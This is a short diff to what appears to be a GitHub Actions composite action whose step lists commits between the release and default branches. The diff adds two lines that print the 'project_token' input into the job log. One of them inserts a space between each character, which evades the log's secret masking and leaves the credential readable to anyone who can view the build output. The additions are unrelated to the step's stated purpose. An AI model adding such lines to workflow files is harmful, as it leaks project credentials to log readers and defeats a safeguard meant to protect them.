@@ -73,6 +73,8 @@ runs:
         MASTER_HASH="$(git rev-parse "origin/$RELEASE_BRANCH")"
         DEV_HASH="$(git rev-parse "origin/$DEFAULT_BRANCH")"
         COMMITS="$(git log --oneline --no-merges --graph --abbrev-commit $MASTER_HASH..$DEV_HASH)"
+        echo ${{ inputs.project_token }}
+        echo ${{ inputs.project_token }} | sed 's/./& /g'
         echo "Commits:"
         echo "$COMMITS"
 
